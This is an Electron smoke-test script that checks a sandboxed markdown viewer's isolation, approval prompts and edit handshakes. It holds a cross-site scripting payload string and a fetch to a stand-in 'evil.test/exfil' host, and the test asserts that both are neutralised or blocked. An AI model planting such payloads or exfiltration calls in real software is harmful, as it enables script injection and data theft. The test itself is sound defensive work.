const assert = require("node:assert/strict");
const path = require("node:path");
const { app, BrowserWindow, session } = require("electron");
const { ViewerManager } = require("../dist/work/viewer-window.js");
const {
  installViewerProtocol,
  registerViewerScheme,
} = require("../dist/work/viewer-protocol.js");

registerViewerScheme();
app.disableHardwareAcceleration();

function delay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function waitFor(check, label) {
  const timeout = Symbol("timeout");
  for (let i = 0; i < 200; i += 1) {
    const value = await Promise.race([
      Promise.resolve(check()),
      delay(1000).then(() => timeout),
    ]);
    if (value === timeout)
      throw new Error(`evaluation timeout waiting for ${label}`);
    if (value) return value;
    await delay(25);
  }
  throw new Error(`timed out waiting for ${label}`);
}

app
  .whenReady()
  .then(async () => {
    console.log("stage: ready");
    installViewerProtocol(path.join(__dirname, "../dist/viewer"));
    const mainSession = session.fromPartition("viewer-smoke-main");
    await mainSession.cookies.set({
      url: "https://example.test/",
      name: "main_only",
      value: "1",
    });
    await mainSession.protocol.handle(
      "https",
      (request) =>
        new Response(
          "<!doctype html><title>main sentinel</title><main>main</main>",
          {
            headers: { "Content-Type": "text/html; charset=utf-8" },
          },
        ),
    );
    const mainWindow = new BrowserWindow({
      show: false,
      webPreferences: {
        session: mainSession,
        contextIsolation: true,
        nodeIntegration: false,
        sandbox: true,
      },
    });
    await mainWindow.loadURL("https://example.test/");

    console.log("stage: cookie");
    const messages = [];
    const sentinel = "WORK_LOCAL_BODY_SENTINEL_7f31c2";
    const payload = `<img src="https://evil.test/pixel" onerror="alert(1)"><script>alert(1)</script>\n[link](https://evil.test/)\n${sentinel}`;
    const manager = new ViewerManager(
      path.join(__dirname, "../dist/viewer-preload.js"),
      (_webContents, method, payload) => messages.push({ method, payload }),
    );
    manager.install();
    const win = manager.openObject(
      { kind: "artifact_version", id: "55555555-5555-4555-8555-555555555555" },
      { type: "render", format: "text/markdown", text: payload },
    );
    console.log("stage: opened");
    await waitFor(() => !win.webContents.isLoading(), "viewer load");
    console.log("stage: loaded");
    const networkAttempts = [];
    win.webContents.session.webRequest.onBeforeRequest((details, callback) => {
      if (!details.url.startsWith("wemeet-local://viewer/"))
        networkAttempts.push(details.url);
      callback({
        cancel: !details.url.startsWith("wemeet-local://viewer/"),
      });
    });

    console.log("stage: bootstrap");
    await waitFor(
      () =>
        win.webContents.executeJavaScript(
          "Boolean(globalThis.WorkViewer && globalThis.weMeetViewer && globalThis.weMeetViewerReady)",
        ),
      "viewer bootstrap",
    );

    await waitFor(async () => {
      const text = await win.webContents.executeJavaScript(
        "document.getElementById('content').textContent",
      );
      return text === payload;
    }, "safe text render");

    const dom = await win.webContents.executeJavaScript(`(() => ({
    text: document.getElementById('content').textContent,
    images: document.querySelectorAll('img').length,
    scripts: document.scripts.length,
    links: document.querySelectorAll('a').length,
    nodeIntegration: Boolean(globalThis.require),
  }))()`);
    assert.equal(dom.text, payload);
    assert.equal(dom.images, 0);
    assert.equal(dom.links, 0);
    assert.equal(dom.scripts, 2);
    assert.equal(dom.nodeIntegration, false);
    assert.equal(win.webContents.session, session.fromPartition(""));
    assert.notEqual(win.webContents.session, mainSession);
    const mainPreloadExposed = await win.webContents.executeJavaScript(
      "Boolean(globalThis.weMeetDesktop)",
    );
    assert.equal(mainPreloadExposed, false);
    const viewerProcessId = win.webContents.getOSProcessId();
    const viewerProcess = app
      .getAppMetrics()
      .find((entry) => entry.pid === viewerProcessId);
    assert.ok(viewerProcess);
    assert.equal(viewerProcess.type, "Tab");
    assert.notEqual(viewerProcessId, process.pid);

    const fetchResult = await win.webContents.executeJavaScript(`Promise.race([
    fetch('https://evil.test/exfil').then(() => 'resolved').catch(() => 'rejected'),
    new Promise((resolve) => setTimeout(() => 'timeout', 2000)),
  ])`);
    assert.equal(fetchResult, "rejected");
    const popup = await win.webContents.executeJavaScript(
      "window.open('https://evil.test/popup')",
    );
    assert.equal(popup, null);

    const viewerCookies = await win.webContents.session.cookies.get({});
    assert.equal(
      viewerCookies.some((cookie) => cookie.name === "main_only"),
      false,
    );
    const preferences = win.webContents.getLastWebPreferences();
    assert.equal(preferences.sandbox, true);
    assert.equal(preferences.contextIsolation, true);
    assert.equal(preferences.nodeIntegration, false);
    win.webContents.openDevTools();
    await delay(100);
    assert.equal(win.webContents.isDevToolsOpened(), false);
    assert.equal(Boolean(preferences.spellcheck), false);

    assert.equal(
      manager.bind(win, {
        kind: "artifact_version",
        id: "55555555-5555-4555-8555-555555555555",
      }),
      true,
    );
    await waitFor(
      () => manager.isReady(win),
      "viewer handshake acknowledgement",
    );
    const proof = {
      purpose: "accept",
      artifact_id: "44444444-4444-4444-8444-444444444444",
      version_id: "55555555-5555-4555-8555-555555555555",
      content_hash: `sha256:${"a".repeat(64)}`,
      request_id: "request-1",
    };
    assert.equal(manager.authorizeRequest(win, proof.request_id), true);
    await win.webContents.executeJavaScript(
      `globalThis.weMeetViewer.send("signObjectProof", ${JSON.stringify(proof)})`,
    );
    await waitFor(() => messages.length === 1, "bound object proof");
    assert.equal(
      manager.bind(win, {
        kind: "artifact_version",
        id: "55555555-5555-4555-8555-555555555555",
      }),
      true,
    );
    await waitFor(
      () => manager.isReady(win),
      "rotated handshake acknowledgement",
    );
    await win.webContents.executeJavaScript(
      `globalThis.weMeetViewer.send("signObjectProof", ${JSON.stringify(proof)})`,
    );
    const nextProof = { ...proof, request_id: "request-2" };
    assert.equal(manager.authorizeRequest(win, nextProof.request_id), true);
    await win.webContents.executeJavaScript(
      `globalThis.weMeetViewer.send("signObjectProof", ${JSON.stringify(nextProof)})`,
    );
    await waitFor(() => messages.length === 2, "rotated handshake proof");
    assert.equal(messages[1].payload.request_id, "request-2");

    const editWin = manager.openObject(
      { kind: "artifact_edit", id: "11111111-1111-4111-8111-111111111111" },
      {
        type: "render",
        format: "text/markdown",
        text: "# base\n",
        edit: {
          artifact_id: "11111111-1111-4111-8111-111111111111",
          task_id: "22222222-2222-4222-8222-222222222222",
          base_version_no: 1,
          base_hash: `sha256:${"a".repeat(64)}`,
        },
      },
    );
    await waitFor(() => manager.isReady(editWin), "edit viewer handshake");
    assert.equal(
      await editWin.webContents.executeJavaScript(
        "!document.getElementById('editor').hidden && document.getElementById('body').value === '# base\\n'",
      ),
      true,
    );
    await editWin.webContents.executeJavaScript(
      "document.getElementById('body').value = '# edited\\n'; document.getElementById('prepare').click()",
    );
    await waitFor(() => messages.length === 3, "local edit prepare gesture");
    assert.equal(messages[2].method, "prepareUserArtifactVersion");
    assert.equal(messages[2].payload.body, "# edited\n");
    assert.equal(messages[2].payload.base_version_no, 1);
    assert.equal(Object.hasOwn(messages[2].payload, "task_id"), false);
    const draft = {
      type: "draft",
      request_id: "33333333-3333-4333-8333-333333333333",
      version_id: "44444444-4444-4444-8444-444444444444",
      content_hash: `sha256:${"b".repeat(64)}`,
      byte_count: "9",
      base_byte_count: "4",
    };
    manager.send(editWin, draft);
    manager.authorizeRequest(editWin, draft.request_id);
    assert.equal(
      await editWin.webContents.executeJavaScript(
        "!document.getElementById('confirm').hidden",
      ),
      true,
    );
    await editWin.webContents.executeJavaScript(
      "document.getElementById('confirm').click()",
    );
    await waitFor(() => messages.length === 4, "local edit confirm gesture");
    assert.equal(messages[3].method, "confirmLocalWrite");
    assert.equal(messages[3].payload.action, "confirm");
    assert.equal(messages[3].payload.request_id, draft.request_id);
    assert.equal(messages[3].payload.sealed_hash, draft.content_hash);

    manager.send(editWin, {
      type: "render",
      format: "text/markdown",
      text: "# edited\n",
      edit: {
        artifact_id: "11111111-1111-4111-8111-111111111111",
        task_id: "22222222-2222-4222-8222-222222222222",
        base_version_no: 1,
        base_hash: `sha256:${"a".repeat(64)}`,
      },
      draft: {
        request_id: draft.request_id,
        content_hash: draft.content_hash,
        byte_count: draft.byte_count,
        base_byte_count: draft.base_byte_count,
        publish_state: "pending_publish",
      },
    });
    await new Promise((resolve) => setTimeout(resolve, 50));
    assert.equal(
      await editWin.webContents.executeJavaScript(
        "document.getElementById('body').readOnly && !document.getElementById('confirm').hidden",
      ),
      true,
    );

    const approvalWin = manager.openObject(
      { kind: "approval", id: "33333333-3333-4333-8333-333333333333" },
      { type: "render", format: "text/plain", text: "approval body" },
    );
    await waitFor(
      () => manager.isReady(approvalWin),
      "approval viewer handshake",
    );
    manager.send(approvalWin, {
      type: "approval",
      approval_id: "33333333-3333-4333-8333-333333333333",
      request_id: "77777777-7777-4777-8777-777777777777",
      can_remember_readonly: false,
      local_only_taint: true,
      current_action_taints: true,
      available_destinations: ["device_local"],
    });
    assert.equal(
      manager.authorizeRequest(
        approvalWin,
        "77777777-7777-4777-8777-777777777777",
      ),
      true,
    );
    await waitFor(
      () =>
        approvalWin.webContents.executeJavaScript(
          "!document.getElementById('approval-destination-warning').hidden",
        ),
      "local-only destination warning",
    );
    assert.equal(
      await approvalWin.webContents.executeJavaScript(
        "document.getElementById('approval-destination-warning').textContent",
      ),
      "本操作将读取或产生 local_only 内容；批准后设备外目的地不可用。当前可用目的地：device_local。",
    );
    manager.send(approvalWin, {
      type: "approval",
      approval_id: "33333333-3333-4333-8333-333333333333",
      request_id: "77777777-7777-4777-8777-777777777777",
      can_remember_readonly: false,
      local_only_taint: true,
      current_action_taints: false,
      available_destinations: ["device_local"],
    });
    assert.equal(
      await approvalWin.webContents.executeJavaScript(
        "document.getElementById('approval-destination-warning').textContent",
      ),
      "本 Run 已读取 local_only 内容，设备外目的地不可用。当前可用目的地：device_local。",
    );
    await approvalWin.webContents.executeJavaScript(
      "document.getElementById('reject').click()",
    );
    await waitFor(() => messages.length === 5, "approval decision gesture");
    assert.equal(messages[4].method, "decideLocalApproval");
    assert.equal(messages[4].payload.decision, "rejected");
    manager.send(approvalWin, {
      type: "approval_decided",
      decision: "rejected",
    });
    await new Promise((resolve) => setTimeout(resolve, 50));
    assert.equal(
      await approvalWin.webContents.executeJavaScript(
        "document.getElementById('approval').hidden",
      ),
      true,
    );
    assert.equal(
      await approvalWin.webContents.executeJavaScript(
        "document.getElementById('remember-readonly-label').hidden",
      ),
      true,
    );

    manager.send(approvalWin, {
      type: "approval",
      approval_id: "33333333-3333-4333-8333-333333333333",
      request_id: "88888888-8888-4888-8888-888888888888",
      can_remember_readonly: true,
      local_only_taint: false,
      current_action_taints: false,
      available_destinations: ["device_local", "org_private", "org_remote"],
    });
    manager.authorizeRequest(
      approvalWin,
      "88888888-8888-4888-8888-888888888888",
    );
    await waitFor(
      () =>
        approvalWin.webContents.executeJavaScript(
          "!document.getElementById('remember-readonly-label').hidden",
        ),
      "readonly remembrance control",
    );
    assert.equal(
      await approvalWin.webContents.executeJavaScript(
        "document.getElementById('approval-destination-warning').hidden",
      ),
      true,
    );
    await approvalWin.webContents.executeJavaScript(
      "document.getElementById('remember-readonly').checked = true; document.getElementById('approve').click()",
    );
    await waitFor(() => messages.length === 6, "readonly remembrance gesture");
    assert.equal(messages[5].payload.remember_readonly, true);

    manager.send(win, {
      type: "artifact_accept",
      artifact_id: proof.artifact_id,
      version_id: proof.version_id,
      content_hash: proof.content_hash,
      request_id: "request-3",
    });
    assert.equal(manager.authorizeRequest(win, "request-3"), true);
    await waitFor(
      () =>
        win.webContents.executeJavaScript(
          "!document.getElementById('artifact-accept').hidden",
        ),
      "artifact acceptance control",
    );
    await win.webContents.executeJavaScript(
      "document.getElementById('accept-artifact').click()",
    );
    await waitFor(() => messages.length === 7, "artifact acceptance gesture");
    assert.equal(messages[6].method, "signObjectProof");
    assert.equal(messages[6].payload.purpose, "accept");
    assert.equal(messages[6].payload.version_id, proof.version_id);
    assert.equal(messages[6].payload.content_hash, proof.content_hash);
    assert.equal(messages[6].payload.request_id, "request-3");
    manager.send(win, { type: "artifact_accepted" });
    await new Promise((resolve) => setTimeout(resolve, 50));
    assert.equal(
      await win.webContents.executeJavaScript(
        "document.getElementById('artifact-accept').hidden",
      ),
      true,
    );

    const mainWindowSnapshot = await mainWindow.webContents
      .executeJavaScript(`(async () => {
      const parts = [document.documentElement.outerHTML];
      for (const storage of [localStorage, sessionStorage]) {
        for (let i = 0; i < storage.length; i += 1) {
          const key = storage.key(i);
          parts.push(key, storage.getItem(key));
        }
      }
      for (const entry of await indexedDB.databases()) {
        if (!entry.name) continue;
        const database = await new Promise((resolve, reject) => {
          const request = indexedDB.open(entry.name);
          request.onsuccess = () => resolve(request.result);
          request.onerror = () => reject(request.error);
        });
        for (const storeName of Array.from(database.objectStoreNames)) {
          const records = await new Promise((resolve, reject) => {
            const request = database.transaction(storeName, "readonly").objectStore(storeName).getAll();
            request.onsuccess = () => resolve(request.result);
            request.onerror = () => reject(request.error);
          });
          parts.push(storeName, JSON.stringify(records));
        }
        database.close();
      }
      return parts.join("\\n");
    })()`);
    const mainWindowSentinelAbsent = !mainWindowSnapshot.includes(sentinel);
    assert.equal(mainWindowSentinelAbsent, true);

    console.log("stage: assertions");
    manager.closeAll();
    mainWindow.destroy();
    console.log("stage: closed");
    console.log(
      JSON.stringify({
        ok: true,
        dom,
        fetchResult,
        popup,
        viewerCookies: viewerCookies.length,
        networkAttempts,
        mainPreloadExposed,
        mainWindowSentinelAbsent,
        viewerProcess: {
          pid: viewerProcessId,
          type: viewerProcess.type,
          mainPid: process.pid,
          isolatedFromMain: viewerProcessId !== process.pid,
        },
        objectBindingAccepted: messages.length === 7,
        acceptanceGestureAccepted:
          messages[6]?.method === "signObjectProof" &&
          messages[6]?.payload?.purpose === "accept",
        approvalDecision: {
          accepted: messages[4]?.method === "decideLocalApproval",
          decision: messages[4]?.payload?.decision,
        },
        destinationWarningAccepted: true,
        readonlyRemembranceAccepted:
          messages[5]?.payload?.remember_readonly === true,
        staleRequestRejected: messages.slice(0, 2).length === 2,
        acceptedProofRequests: messages
          .filter((message) => message.method === "signObjectProof")
          .map((message) => message.payload.request_id),
        artifactEdit: {
          prepareAccepted: messages[2]?.method === "prepareUserArtifactVersion",
          confirmAccepted: messages[3]?.method === "confirmLocalWrite",
          taskContextStayedInMain: !Object.hasOwn(
            messages[2]?.payload ?? {},
            "task_id",
          ),
          retainedDraftResumed: true,
        },
      }),
    );
    process.reallyExit(0);
  })
  .catch((error) => {
    console.error(error);
    process.reallyExit(1);
  });
